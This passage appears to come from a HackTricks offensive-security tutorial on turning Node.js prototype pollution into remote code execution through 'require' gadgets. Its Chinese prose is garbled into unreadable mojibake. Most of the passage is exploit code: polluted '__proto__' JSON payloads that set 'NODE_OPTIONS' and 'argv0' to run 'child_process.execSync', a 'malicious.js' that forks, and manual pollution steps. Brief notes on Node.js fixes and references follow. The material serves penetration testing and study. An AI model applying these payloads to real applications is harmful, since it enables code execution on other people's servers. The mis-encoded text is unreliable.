USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### ç›¸å¯¹ require - 2

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

## VMå°å·¥å…·

åœ¨è®ºæ–‡[https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)ä¸­è¿˜æŒ‡å‡ºï¼Œå¯ä»¥ä½¿ç”¨**`vm`**åº“çš„æŸäº›æ–¹æ³•ä¸­çš„**`contextExtensions`**çš„æ§åˆ¶ä½œä¸ºå°å·¥å…·ã€‚\
ç„¶è€Œï¼Œä¸ä¹‹å‰çš„**`child_process`**æ–¹æ³•ä¸€æ ·ï¼Œå®ƒå·²ç»åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­è¢«**ä¿®å¤**ã€‚

## ä¿®å¤å’Œæ„å¤–ä¿æŠ¤

è¯·æ³¨æ„ï¼Œå¦‚æœæ­£åœ¨è®¿é—®çš„å¯¹è±¡çš„**å±æ€§**æ˜¯**æœªå®šä¹‰**çš„ï¼Œåˆ™åŸå‹æ±¡æŸ“ä¼šèµ·ä½œç”¨ã€‚å¦‚æœåœ¨**ä»£ç **ä¸­å°†è¯¥**å±æ€§**è®¾ç½®ä¸º**å€¼**ï¼Œåˆ™**æ— æ³•è¦†ç›–å®ƒ**ã€‚

åœ¨2022å¹´6æœˆçš„[**æ­¤æäº¤**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a)ä¸­ï¼Œå˜é‡`options`ä¸å†æ˜¯`{}`ï¼Œè€Œæ˜¯**`kEmptyObject`**ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢åŸå‹æ±¡æŸ“å½±å“**`options`**çš„å±æ€§ä»¥è·å–RCEã€‚\
è‡³å°‘ä»v18.4.0å¼€å§‹ï¼Œå·²ç»å®æ–½äº†è¿™ç§ä¿æŠ¤æªæ–½ï¼Œå› æ­¤`spawn`å’Œ`spawnSync`çš„**åˆ©ç”¨**æ–¹æ³•ä¸å†èµ·ä½œç”¨ï¼ˆå¦‚æœæ²¡æœ‰ä½¿ç”¨`options`çš„è¯ï¼ï¼‰ã€‚

åœ¨[**æ­¤æäº¤**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9)ä¸­ï¼Œè¿˜é€šè¿‡å°†optionsè®¾ç½®ä¸º**`kEmptyObject`**è€Œä¸æ˜¯**`{}`**æ¥**ä¿®å¤äº†**vmåº“ä¸­çš„**åŸå‹æ±¡æŸ“**é—®é¢˜ã€‚

## å‚è€ƒèµ„æ–™

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Šå—ï¼Ÿæˆ–è€…æƒ³è¦è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
